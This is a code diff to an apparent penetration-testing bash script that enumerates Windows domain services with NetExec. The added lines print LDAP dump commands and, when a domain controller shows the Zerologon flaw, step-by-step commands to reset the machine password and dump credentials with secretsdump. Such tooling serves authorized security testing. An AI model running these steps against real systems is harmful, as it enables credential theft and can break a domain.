@@ -163,7 +163,25 @@ echo -e "\n\033[96m[+] Checking FTP Anonymous access\033[0m"
 timeout 5s nxc ftp $IP -u 'anonymous' -p 'anonymous' --timeout 2
 
 echo -e "\n\033[96m[+] Checking LDAP Anonymous access\033[0m"
-timeout 5s nxc ldap $IP -u '' -p '' --timeout 2
+ldap_output=$(timeout 5s nxc ldap $IP -u '' -p '' --timeout 2)
+echo "$ldap_output"
+
+# Check if anonymous LDAP access succeeded and suggest commands
+if echo "$ldap_output" | grep -q "\[+\]"; then
+    echo -e "\n\033[92m[+] Anonymous LDAP access successful! Suggested commands:\033[0m"
+    
+    # Extract domain from output for base DN
+    if [ -n "$domain" ]; then
+        base_dn=$(echo "$domain" | sed 's/\./,DC=/g' | sed 's/^/DC=/')
+        echo "ldapsearch -x -H ldap://$IP -b \"$base_dn\" -s sub \"(objectClass=*)\" | tee ldap-dump.txt"
+        echo "ldapsearch -x -H ldap://$IP -b \"$base_dn\" \"(objectClass=user)\" | tee ldap-users.txt"
+        echo "ldapsearch -x -H ldap://$IP -b \"$base_dn\" \"(objectClass=group)\" | tee ldap-groups.txt"
+    else
+        echo "ldapsearch -x -H ldap://$IP -b \"\" -s base namingContexts  # Get base DN"
+        echo "# Then use: ldapsearch -x -H ldap://$IP -b \"DC=domain,DC=com\" -s sub \"(objectClass=*)\""
+    fi
+    echo ""
+fi
 
 echo -e "\n\033[96m[+] NFS Enumeration (No credentials required)\033[0m"
 nfs_output=$(unbuffer nxc nfs $IP --shares | tee nxc-enum/smb/nfs-shares.txt)
@@ -469,10 +487,36 @@ if [ -n "$user" ]; then
     echo -e "\n\033[96m[+] SMB Module Enumeration:\033[0m"
 
     echo -e "\n\033[91m[+] Spider Plus (Find Interesting Files)\033[0m\n"
-    unbuffer nxc smb $IP $USER_FLAG -M spider_plus | tee nxc-enum/smb/spider-plus.txt
+    timeout 60s unbuffer nxc smb $IP $USER_FLAG -M spider_plus --timeout 10 | tee nxc-enum/smb/spider-plus.txt
 
     echo -e "\n\033[91m[+] Check Zerologon Vulnerability\033[0m\n"
-    timeout 30s unbuffer nxc smb $IP $USER_FLAG -M zerologon --timeout 5 | tee nxc-enum/smb/zerologon.txt
+    zerologon_output=$(timeout 30s unbuffer nxc smb $IP $USER_FLAG -M zerologon --timeout 5 | tee nxc-enum/smb/zerologon.txt)
+    echo "$zerologon_output"
+    
+    # Check if Zerologon vulnerability was found
+    if echo "$zerologon_output" | grep -qi "VULNERABLE\|Exploit\|SUCCESS"; then
+        echo -e "\n\033[91m[!!!] CRITICAL: Zerologon vulnerability detected!\033[0m"
+        echo -e "\033[93m[!] WARNING: Exploiting Zerologon will break the domain! Only use in authorized testing.\033[0m"
+        echo -e "\n\033[92m[+] Suggested exploitation steps:\033[0m"
+        
+        # Extract DC name if possible
+        dc_name=$(echo "$zerologon_output" | grep -oP 'name:\K[^\)]+' | head -n1 | tr -d ' ')
+        if [ -z "$dc_name" ]; then
+            dc_name="DC_NAME"
+        fi
+        
+        echo "# 1. Exploit Zerologon to reset DC machine account password:"
+        echo "python3 /usr/share/doc/python3-impacket/examples/zerologon_tester.py $dc_name $IP"
+        echo ""
+        echo "# 2. Dump credentials using the zeroed password:"
+        echo "impacket-secretsdump -no-pass $dc_name\$@$IP"
+        echo ""
+        echo "# 3. IMPORTANT: Restore the original password using the hex key from secretsdump:"
+        echo "python3 /path/to/restorepassword.py $dc_name $IP -hexpass <HEX_PASSWORD_FROM_SECRETSDUMP>"
+        echo ""
+        echo -e "\033[91m[!!!] CRITICAL: You MUST restore the password or the domain will be broken!\033[0m"
+        echo ""
+    fi
 
     echo -e "\n\033[96m[+] MSSQL Enumeration:\033[0m"
 
